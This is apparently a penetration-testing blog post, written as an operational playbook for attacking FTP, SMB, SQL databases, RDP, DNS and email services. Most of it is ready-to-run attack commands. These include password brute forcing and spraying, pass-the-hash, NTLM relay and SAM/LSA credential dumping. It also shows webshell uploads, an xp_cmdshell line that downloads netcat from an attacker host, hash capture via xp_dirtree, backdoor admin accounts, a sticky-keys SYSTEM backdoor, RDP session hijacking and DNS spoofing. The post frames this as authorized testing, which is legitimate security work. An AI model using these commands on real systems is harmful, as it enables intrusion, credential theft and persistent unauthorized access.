+++
title = "Attacking Common Services: Enumeration, Exploitation & Post-Compromise Playbook"
date = 2026-02-25T00:00:00Z
draft = false
description = "A practitioner's deep-dive into attacking the most common network services — FTP, SMB, SQL databases, RDP, DNS, and Email. Phase-ordered attack chains covering enumeration, authentication attacks, command execution, lateral movement, and persistence. Built for operators who need precision tradecraft, not theory."
tags = ["Service Exploitation", "SMB", "FTP", "RDP", "SQL Injection", "DNS Attacks", "Email Security", "NTLM Relay", "Pass-the-Hash", "Penetration Testing"]
+++

# Attacking Common Services: Enumeration, Exploitation & Post-Compromise Playbook

Every network runs on services. Every service has a configuration. Every configuration has a gap. This post is a phase-ordered attack reference for the six most common services you will encounter on any internal engagement or external assessment — FTP, SMB, SQL databases, RDP, DNS, and Email.

The structure is consistent across all services: enumerate first, authenticate second, exploit third, persist where authorized. Every command is operational. Nothing here is academic.

---

## Service Port Quick Reference

| Service | Default Ports | Alt Ports | Key Tools |
|---|---|---|---|
| **FTP** | 21 (TCP) | 2021, 8021 | ftp, hydra, nmap, ncftp |
| **TFTP** | 69 (UDP) | — | tftp, atftp, nmap |
| **SMB/NetBIOS** | 139, 445 (TCP) | — | smbclient, netexec, impacket, rpcclient |
| **MSSQL** | 1433 (TCP) | 1434 | sqlcmd, impacket-mssqlclient, sqsh |
| **MySQL** | 3306 (TCP) | 3307 | mysql, hydra, nmap NSE |
| **PostgreSQL** | 5432 (TCP) | 5433 | psql, hydra |
| **RDP** | 3389 (TCP) | 3390–3399 | xfreerdp, rdesktop, hydra, crowbar |
| **DNS** | 53 (UDP/TCP) | 5353 | dig, host, subfinder, fierce, dnsrecon |
| **SMTP** | 25, 465, 587 (TCP) | 2525 | swaks, smtp-user-enum, hydra |
| **POP3/IMAP** | 110, 143, 993, 995 (TCP) | — | telnet, hydra, curl |
| **LDAP** | 389, 636 (TCP) | 3268, 3269 | ldapsearch, ldapdomaindump |
| **SNMP** | 161, 162 (UDP) | — | snmpwalk, onesixtyone, snmp-check |

---

## 1. FTP Attacks

FTP is legacy infrastructure that never dies. Misconfigurations are endemic — anonymous access, plaintext credentials, writable directories, and backdoored server software appear constantly on real engagements.

### Phase 1: Enumeration & Reconnaissance

```bash
# Banner grabbing — get version before anything else
nc -nv $TARGET_IP 21
telnet $TARGET_IP 21

# Comprehensive NSE scan
nmap -sC -sV -p21 $TARGET_IP
nmap --script ftp-* -p21 $TARGET_IP

# Targeted vulnerability checks
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor -p21 $TARGET_IP

# Version and system info
nmap --script banner,ftp-syst -p21 $TARGET_IP
```

### Phase 2: Authentication Testing

#### Anonymous Access — Always Try First

```bash
# Method 1: Interactive FTP client
ftp $TARGET_IP
# Credentials to attempt: anonymous:anonymous | anonymous:email@domain.com | anonymous:[blank]

# Method 2: Automated
hydra -l anonymous -p "" ftp://$TARGET_IP
hydra -l ftp -p ftp ftp://$TARGET_IP

# Method 3: Scripted sweep
for user in anonymous ftp guest; do
    for pass in "" anonymous ftp guest; do
        echo "Trying $user:$pass"
        echo -e "$user\n$pass\nquit" | ftp -n $TARGET_IP
    done
done
```

#### Brute Force

```bash
# Standard brute force
hydra -L users.txt -P passwords.txt ftp://$TARGET_IP

# Rate-limited — avoid triggering lockout/IDS
hydra -L users.txt -P passwords.txt -t 4 -W 5 ftp://$TARGET_IP

# Single user, rockyou
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP

# Target-customized wordlist
cewl http://$TARGET_DOMAIN -w custom_wordlist.txt
hydra -L users.txt -P custom_wordlist.txt ftp://$TARGET_IP
```

### Phase 3: Post-Authentication Exploitation

```bash
# Connect and explore
ftp $TARGET_IP
ftp> pwd                        # Current directory
ftp> ls -la                     # Detailed listing
ftp> cd ../                     # Directory traversal attempt
ftp> get /etc/passwd passwd     # Pull sensitive files
ftp> put shell.php              # Upload webshell if web root
ftp> chmod 755 shell.php        # Set execute permissions

# Batch operations
ftp> prompt off                 # Disable per-file prompts
ftp> mget *                     # Download everything
ftp> binary                     # Binary mode for executables
ftp> put nc.exe                 # Upload netcat

# Alternative clients
ncftp -u username -p password $TARGET_IP
lftp ftp://username:password@$TARGET_IP
```

### Phase 4: FTP Bounce Attack

An FTP server with bounce enabled can be abused to scan internal networks — your scan traffic originates from the FTP server, not your IP.

```bash
# Scan internal range through the FTP server
nmap -b anonymous:password@$TARGET_IP $INTERNAL_SUBNET/24

# Manual bounce — probe internal host
ftp $TARGET_IP
ftp> quote "PORT $INTERNAL_IP_OCTET_FORMAT,0,80"
ftp> quote "LIST"
```

### Phase 5: Post-Compromise Config Analysis

```bash
# Locate configuration files
find / -name "*.conf" 2>/dev/null | grep -i ftp
cat /etc/vsftpd.conf
cat /etc/proftpd.conf

# Review transfer logs for credential reuse clues
tail -f /var/log/vsftpd.log
tail -f /var/log/xferlog
```

---

## 2. SMB / NetBIOS Attacks

SMB is the highest-value service on any Windows network. Null sessions, NTLM relay, pass-the-hash, credential dumping, and lateral movement all flow through port 445. Master this service and you own Windows environments.

### Phase 1: Initial Reconnaissance

```bash
# Port and protocol scan
nmap -p139,445 -sV -sC $TARGET_IP
nmap -p139,445 --script smb-protocols $TARGET_IP

# NetBIOS name resolution
nbtscan $TARGET_IP
nmblookup -A $TARGET_IP

# SMB version and share listing
smbclient -L //$TARGET_IP/ -N
netexec smb $TARGET_IP
```

#### Null Session Enumeration — No Credentials Required

```bash
# RPC null session
rpcclient -U '' -N $TARGET_IP
rpcclient $> enumdomusers      # Dump all domain users
rpcclient $> enumdomgroups     # Dump all domain groups
rpcclient $> querydominfo      # Domain policy info
rpcclient $> getdompwinfo      # Password policy — critical for spraying

# Alternative null session tools
smbclient -N -L //$TARGET_IP/
smbmap -H $TARGET_IP -u null -p ""
enum4linux-ng $TARGET_IP -A
```

### Phase 2: Share Enumeration & Access

```bash
# Discover all shares
smbclient -L //$TARGET_IP/ -N
smbmap -H $TARGET_IP
netexec smb $TARGET_IP --shares

# Enumerate specific share contents
smbmap -H $TARGET_IP -R $SHARE_NAME
smbclient //$TARGET_IP/$SHARE_NAME -N

# Permission testing
smbmap -H $TARGET_IP -r $SHARE_NAME

# Connect and operate
smbclient //$TARGET_IP/$SHARE_NAME
smb: \> ls
smb: \> get file.txt
smb: \> put shell.php
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

# Mount share on Linux
mkdir /mnt/smb
mount -t cifs //$TARGET_IP/$SHARE_NAME /mnt/smb -o username=guest,password=
```

### Phase 3: Authentication Attacks

#### Password Spraying — Know the Policy First

```bash
# Single password, multiple users (get policy from rpcclient first)
netexec smb $TARGET_IP -u users.txt -p 'Password123!' --continue-on-success

# Domain-wide spray across subnet
netexec smb $TARGET_SUBNET/24 -u users.txt -p 'Company2024!' -d $DOMAIN

# Multiple passwords against known account
netexec smb $TARGET_IP -u administrator -p passwords.txt
```

#### Hash-Based Attacks

```bash
# Pass-the-Hash
netexec smb $TARGET_IP -u administrator -H $NTLM_HASH
impacket-psexec administrator@$TARGET_IP -hashes :$NTLM_HASH

# SAM database dump
netexec smb $TARGET_IP -u administrator -p $PASSWORD --sam
impacket-secretsdump administrator:$PASSWORD@$TARGET_IP

# LSA secrets
netexec smb $TARGET_IP -u administrator -p $PASSWORD --lsa
```

### Phase 4: Command Execution

```bash
# PSExec — noisy but reliable, requires admin
impacket-psexec $DOMAIN/user:$PASSWORD@$TARGET_IP
netexec smb $TARGET_IP -u admin -p $PASSWORD -x 'whoami'

# WMIExec — lower footprint
impacket-wmiexec $DOMAIN/user:$PASSWORD@$TARGET_IP

# SMBExec — no binary drop
impacket-smbexec $DOMAIN/user:$PASSWORD@$TARGET_IP

# DCOMExec — uses COM objects
impacket-dcomexec $DOMAIN/user:$PASSWORD@$TARGET_IP
```

### Phase 5: NTLM Relay Attacks

When SMB signing is disabled or not enforced, captured NTLM authentications can be relayed to other hosts for code execution.

```bash
# Step 1: Identify hosts without SMB signing
netexec smb $TARGET_SUBNET/24 --gen-relay-list relay_targets.txt

# Step 2: Turn off SMB and HTTP in Responder.conf, then start Responder
sudo responder -I eth0 -dw

# Step 3: Start ntlmrelayx (separate terminal)
impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP -c "whoami"

# With PowerShell payload
impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP -c "powershell -e $BASE64_PAYLOAD"

# Relay to multiple targets
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
```

### Phase 6: Persistence

```bash
# Add backdoor admin user
net user hacker Password123! /add
net localgroup administrators hacker /add

# Enable RDP for persistent GUI access
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

---

## 3. SQL Database Attacks

Database services sitting on default ports with default credentials are common. From unauthenticated MSSQL to root MySQL, once you're in, `xp_cmdshell` and `INTO OUTFILE` turn a database into a full RCE platform.

### Phase 1: Discovery & Fingerprinting

```bash
# Multi-DB port scan
nmap -p1433,3306,5432 -sV -sC $TARGET_IP

# MSSQL-specific detection
nmap -p1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-xp-cmdshell $TARGET_IP

# MySQL-specific detection
nmap -p3306 --script mysql-info,mysql-variables $TARGET_IP

# PostgreSQL detection
nmap -p5432 --script pgsql-brute $TARGET_IP

# Banner grabbing
nc -nv $TARGET_IP 1433
telnet $TARGET_IP 3306
```

### Phase 2: Authentication Testing

#### Default Credentials

```
MSSQL:      sa:sa | sa:[blank] | admin:admin | administrator:[blank]
MySQL:      root:root | root:[blank] | admin:admin | mysql:mysql
PostgreSQL: postgres:postgres | postgres:[blank] | admin:admin
```

#### Brute Force

```bash
# MSSQL
hydra -L users.txt -P passwords.txt mssql://$TARGET_IP
netexec mssql $TARGET_IP -u sa -p passwords.txt

# MySQL
hydra -L users.txt -P passwords.txt mysql://$TARGET_IP
nmap -p3306 --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt $TARGET_IP

# PostgreSQL
hydra -L users.txt -P passwords.txt postgres://$TARGET_IP
```

### Phase 3: Database Connection & Enumeration

#### MSSQL

```bash
# Linux
impacket-mssqlclient sa:$PASSWORD@$TARGET_IP
sqsh -S $TARGET_IP -U sa -P $PASSWORD -h

# Windows
sqlcmd -S $TARGET_IP -U sa -P $PASSWORD
```

```sql
-- Version
SELECT @@version;
SELECT SERVERPROPERTY('ProductVersion');

-- Enumerate databases
SELECT name FROM master.dbo.sysdatabases;

-- Tables in current database
SELECT table_name FROM INFORMATION_SCHEMA.TABLES;

-- User and privilege enumeration
SELECT name FROM sys.syslogins;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT system_user;

-- Linked servers — pivot opportunity
SELECT srvname FROM master.dbo.sysservers;
EXEC sp_linkedservers;
```

#### MySQL

```bash
mysql -u root -p -h $TARGET_IP
mysql -u root -p$PASSWORD -h $TARGET_IP -P 3306
```

```sql
-- System info
SELECT version();
SELECT user();
SELECT database();

-- Enumerate
SHOW DATABASES;
SHOW TABLES;
DESCRIBE table_name;

-- User and privilege dump
SELECT user,host,password FROM mysql.user;
SELECT grantee,privilege_type FROM information_schema.user_privileges;

-- Check file read/write privileges
SELECT user,file_priv FROM mysql.user WHERE user='root';
```

#### PostgreSQL

```bash
psql -h $TARGET_IP -U postgres -d postgres
```

### Phase 4: Command Execution

#### MSSQL — xp_cmdshell

```sql
-- Enable xp_cmdshell (if disabled)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user hacker Password123! /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- Download and execute payload
EXEC xp_cmdshell 'powershell -c "wget http://$ATTACKER_IP/nc.exe -outfile c:\temp\nc.exe"';

-- Alternative if xp_cmdshell is blocked
DECLARE @myshell INT;
EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT;
EXEC sp_oamethod @myshell, 'run', null, 'cmd /c "whoami > c:\temp\out.txt"';
```

#### MySQL — File Operations

```sql
-- Write webshell to web root
SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php';

-- Read sensitive files
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');

-- Write to temp
SELECT 'test' INTO OUTFILE '/tmp/test.txt';
```

#### MSSQL — Force NTLM Auth (Hash Capture)

With Responder running on your attack host, trigger outbound authentication from the SQL server:

```sql
EXEC master..xp_dirtree '\\$ATTACKER_IP\share';
EXEC master..xp_subdirs '\\$ATTACKER_IP\share';
EXEC master..xp_fileexist '\\$ATTACKER_IP\share\file.txt';
```

The SQL service account hash hits your Responder listener. Crack offline or relay.

### Phase 5: Privilege Escalation

#### MSSQL Impersonation

```sql
-- Identify impersonable logins
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate SA
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
```

#### Linked Server Command Execution

```sql
-- Execute on linked server
EXECUTE('SELECT system_user') AT [LINKED_SERVER];

-- Enable xp_cmdshell on linked server
EXECUTE('EXEC sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER];
EXECUTE('EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER];

-- Command execution via linked server
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

---

## 4. RDP Attacks

RDP is the universal Windows management interface. It exposes the full session — including the desktop of any logged-in user. Beyond brute force, session hijacking and pass-the-hash via restricted admin mode are the high-value techniques here.

### Phase 1: Enumeration

```bash
# Service detection
nmap -p3389 -sV -sC $TARGET_IP
nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption $TARGET_IP

# NLA status — determines attack approach
nmap -p3389 --script rdp-ntlm-info $TARGET_IP

# Certificate extraction — reveals hostname, domain
nmap -p3389 --script rdp-ntlm-info $TARGET_IP
```

### Phase 2: Authentication Attacks

```bash
# Hydra brute force — throttled to avoid lockout
hydra -L users.txt -P passwords.txt rdp://$TARGET_IP -t 4 -W 5

# Crowbar — purpose-built for RDP spraying
crowbar -b rdp -s $TARGET_IP/32 -U users.txt -c 'Password123!'

# Ncrack
ncrack -vv --user administrator -P passwords.txt rdp://$TARGET_IP

# Manual credential test
xfreerdp /v:$TARGET_IP /u:administrator /p:$PASSWORD /cert-ignore
```

### Phase 3: Connection Methods

```bash
# Standard xfreerdp connection
xfreerdp /v:$TARGET_IP /u:$USERNAME /p:$PASSWORD /cert-ignore /compression /clipboard

# Fullscreen
xfreerdp /v:$TARGET_IP /u:$USERNAME /p:$PASSWORD /f

# Specific resolution
xfreerdp /v:$TARGET_IP /u:$USERNAME /p:$PASSWORD /size:1920x1080

# With domain
xfreerdp /v:$TARGET_IP /d:$DOMAIN /u:$USERNAME /p:$PASSWORD /cert-ignore

# Pass-the-Hash (requires Restricted Admin Mode enabled on target)
xfreerdp /v:$TARGET_IP /u:$USERNAME /pth:$NTLM_HASH /cert-ignore
```

#### Enabling Restricted Admin Mode (for PTH)

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

### Phase 4: Session Hijacking

With SYSTEM privileges, you can hijack active user sessions — including sessions locked or disconnected — without knowing the user's password.

```cmd
# List active sessions
query user
query session
qwinsta

# Hijack a target session
sc create sessionhijack binpath="cmd.exe /k tscon $TARGET_SESSION_ID /dest:$OUR_SESSION"
net start sessionhijack

# Alternative direct hijack
tscon $TARGET_SESSION_ID /dest:$OUR_SESSION /password:$PASSWORD

# Shadow session — view only, no interaction
mstsc /shadow:$SESSION_ID /control /noconsentprompt
```

### Phase 5: Persistence & Sticky Keys Backdoor

```cmd
# Enable RDP remotely via registry
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Open firewall rule
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Disable NLA for easier future access
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f

# Add user with RDP access
net user hacker Password123! /add
net localgroup "Remote Desktop Users" hacker /add
net localgroup administrators hacker /add
```

#### Sticky Keys Backdoor — SYSTEM Shell at Login Screen

```cmd
# Backup original binary
copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc.exe.bak

# Replace with cmd.exe
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# Trigger: press Shift 5 times at the RDP login screen
# Result: SYSTEM-level cmd.exe with no authentication required
```

---

## 5. DNS Attacks

DNS is almost always trusted. Misconfigured zone transfers, cache poisoning, subdomain takeover, and DNS tunneling are all active attack surfaces — both for exploitation and for covert communications post-compromise.

### Phase 1: Basic DNS Reconnaissance

```bash
# NS server discovery
nslookup $TARGET_DOMAIN
dig NS $TARGET_DOMAIN
host -t NS $TARGET_DOMAIN

# Query specific DNS server
dig @$DNS_SERVER $TARGET_DOMAIN
nslookup $TARGET_DOMAIN $DNS_SERVER
```

#### Full Record Type Enumeration

```bash
dig A $TARGET_DOMAIN        # IPv4 addresses
dig AAAA $TARGET_DOMAIN     # IPv6 addresses
dig MX $TARGET_DOMAIN       # Mail servers
dig NS $TARGET_DOMAIN       # Nameservers
dig TXT $TARGET_DOMAIN      # SPF, DKIM, verification tokens
dig CNAME $TARGET_DOMAIN    # Aliases
dig SOA $TARGET_DOMAIN      # Zone authority + admin contact
dig PTR $TARGET_IP          # Reverse lookup
dig ANY $TARGET_DOMAIN      # All available records
```

### Phase 2: Zone Transfer Attacks

```bash
# Single nameserver test
dig AXFR $TARGET_DOMAIN @$DNS_SERVER
host -l $TARGET_DOMAIN $DNS_SERVER

# Automated — test all discovered nameservers
for ns in $(dig +short NS $TARGET_DOMAIN); do
    echo "[*] Testing $ns"
    dig AXFR $TARGET_DOMAIN @$ns
done

# Automated tools
fierce --domain $TARGET_DOMAIN
dnsrecon -d $TARGET_DOMAIN -t axfr
```

#### DNSSEC Zone Walking

```bash
# NSEC walking (older DNSSEC)
dig +dnssec $TARGET_DOMAIN NS
ldns-walk $TARGET_DOMAIN

# NSEC3 walking
nsec3walker $TARGET_DOMAIN
```

### Phase 3: Subdomain Enumeration

```bash
# Active brute-force
subfinder -d $TARGET_DOMAIN -v -o subdomains.txt
assetfinder $TARGET_DOMAIN
amass enum -d $TARGET_DOMAIN
gobuster dns -d $TARGET_DOMAIN -w wordlist.txt -t 50

# Recursive
dnsrecon -d $TARGET_DOMAIN -t brt -D subdomains.txt

# Passive — Certificate Transparency
curl -s "https://crt.sh/?q=%25.$TARGET_DOMAIN&output=json" | jq -r '.[].name_value' | sort -u
```

### Phase 4: DNS Cache Poisoning

#### Cache Snooping — What Has the Resolver Cached?

```bash
# Single domain check
dig +norecurse @$DNS_SERVER $TARGET_DOMAIN

# Batch snooping
for domain in $(cat domains.txt); do
    dig +norecurse @$DNS_SERVER $domain | grep -q "ANSWER: 1" && echo "$domain is cached"
done
```

#### DNS Spoofing via Ettercap

```bash
# Inject spoofed records
echo "$TARGET_DOMAIN A $ATTACKER_IP" >> /etc/ettercap/etter.dns
echo "*.$TARGET_DOMAIN A $ATTACKER_IP" >> /etc/ettercap/etter.dns

# Start ARP + DNS spoof attack
ettercap -T -i $INTERFACE -M arp:remote /$TARGET_IP// /$GATEWAY// -P dns_spoof
```

### Phase 5: Advanced DNS Attacks

#### DNS Tunneling Detection

High query volume, unusual record types (TXT, NULL, CNAME), and suspiciously long domain names are the tells.

```bash
# Monitor DNS query volume live
tshark -i $INTERFACE -f "udp port 53" -T fields -e dns.qry.name | sort | uniq -c | sort -nr

# Check TXT records on suspicious domains
dig TXT $SUSPICIOUS_DOMAIN
```

#### DNS Rebinding

```bash
# Setup rebinding server — returns public IP first, internal IP on subsequent requests
python3 dns-rebinding-toolkit.py --interface $ATTACKER_IP --target $INTERNAL_IP
```

---

## 6. Email Service Attacks

Email infrastructure is a high-value target — SMTP enumeration surfaces valid users, open relays enable spoofing, and O365 spray attacks yield initial access credentials. POP3/IMAP access post-compromise means full mailbox access for intelligence gathering.

### Phase 1: Mail Infrastructure Reconnaissance

```bash
# MX record enumeration — identify mail servers
dig MX $TARGET_DOMAIN
host -t MX $TARGET_DOMAIN
nslookup -type=MX $TARGET_DOMAIN

# SPF — reveals authorized sending infrastructure
dig TXT $TARGET_DOMAIN | grep -i spf

# DMARC — enforcement policy
dig TXT _dmarc.$TARGET_DOMAIN

# DKIM — signing keys
dig TXT default._domainkey.$TARGET_DOMAIN

# Full port scan
nmap -sV -sC -p25,110,143,465,587,993,995 $MAIL_SERVER

# SSL/TLS cipher audit
nmap --script ssl-enum-ciphers -p 465,993,995 $MAIL_SERVER
```

### Phase 2: SMTP Attacks

#### Banner Grabbing

```bash
nc -nv $MAIL_SERVER 25
telnet $MAIL_SERVER 25
```

#### Manual SMTP Session

```
HELO $ATTACKER_DOMAIN
MAIL FROM: <test@$ATTACKER_DOMAIN>
RCPT TO: <target@$TARGET_DOMAIN>
DATA
Subject: Test Email
Test body content.
.
QUIT
```

#### Username Enumeration via SMTP

VRFY, EXPN, and RCPT TO responses differ between valid and invalid users on misconfigured servers.

```bash
# Automated enumeration — three methods
smtp-user-enum -M VRFY -U users.txt -t $MAIL_SERVER
smtp-user-enum -M EXPN -U users.txt -t $MAIL_SERVER
smtp-user-enum -M RCPT -U users.txt -D $TARGET_DOMAIN -t $MAIL_SERVER

# Manual VRFY
telnet $MAIL_SERVER 25
VRFY root
VRFY admin
VRFY administrator

# Manual EXPN (mailing list expansion)
EXPN root
EXPN administrators
```

#### Open Relay Testing

An open relay allows unauthenticated email sending to any external address — a critical misconfiguration enabling spam and phishing.

```bash
# Automated test
nmap -p25 --script smtp-open-relay $MAIL_SERVER

# Manual test
telnet $MAIL_SERVER 25
MAIL FROM: <spoof@external.com>
RCPT TO: <target@external.com>

# Send through relay with swaks
swaks --from spoof@external.com \
      --to target@external.com \
      --server $MAIL_SERVER \
      --header 'Subject: Relay Test' \
      --body 'Testing relay misconfiguration'
```

### Phase 3: Authentication Brute Force

```bash
# SMTP AUTH
hydra -L users.txt -P passwords.txt smtp://$MAIL_SERVER:25
hydra -L users.txt -P passwords.txt smtp://$MAIL_SERVER:587

# SMTPS
hydra -L users.txt -P passwords.txt smtps://$MAIL_SERVER:465

# POP3
hydra -L users.txt -P passwords.txt pop3://$MAIL_SERVER
hydra -L users.txt -P passwords.txt pop3s://$MAIL_SERVER:995

# IMAP
hydra -L users.txt -P passwords.txt imap://$MAIL_SERVER
hydra -L users.txt -P passwords.txt imaps://$MAIL_SERVER:993
```

### Phase 4: POP3 and IMAP Manual Access

#### POP3

```bash
telnet $MAIL_SERVER 110
USER $USERNAME
PASS $PASSWORD
LIST            # List all messages with sizes
RETR 1          # Download message 1
DELE 1          # Delete message 1
QUIT
```

#### IMAP

```bash
telnet $MAIL_SERVER 143
a LOGIN $USERNAME $PASSWORD
a LIST "" "*"       # List all folders
a SELECT INBOX      # Open inbox
a SEARCH ALL        # List all message IDs
a FETCH 1 BODY[]    # Download full message 1
a LOGOUT
```

### Phase 5: Cloud Email — Office 365 Attacks

```bash
# Confirm O365 is in use for the domain
python3 o365spray.py --validate --domain $TARGET_DOMAIN

# Username enumeration — identify valid accounts
python3 o365spray.py --enum -U users.txt --domain $TARGET_DOMAIN

# Password spraying — one attempt per account to avoid lockout
python3 o365spray.py --spray -U valid_users.txt -p 'SeasonYear!' \
    --count 1 --lockout 1 --domain $TARGET_DOMAIN

# With realistic user agent
python3 o365spray.py --spray -U users.txt -p 'Password123!' \
    --useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    --domain $TARGET_DOMAIN
```

---

## Operational Principles

**Enumerate before you authenticate.** Version information and null session data determine your attack path before you touch a credential.

**Password policy before spraying.** One wrong spray cycle against an Active Directory environment locks out every account you have. Pull the policy from `rpcclient` first — always.

**Layer your attack methods.** Default creds fail → brute force. Brute force is detected → hash relay. Every blocked path has a bypass.

**Hash capture beats cracking.** `xp_dirtree` to your Responder listener, NTLM relay against unsigned SMB hosts, forcing outbound auth from SQL — capturing hashes live is faster and more reliable than offline cracking in most environments.

**Document lateral movement chains.** The MSSQL service account that authenticates to a linked server, which you relay to a domain controller — that chain needs to be reproducible and documented. If you can't walk the client through it step by step, it didn't happen.

---

*Every port is an assumption. Your job is to find out where the assumption was wrong.*
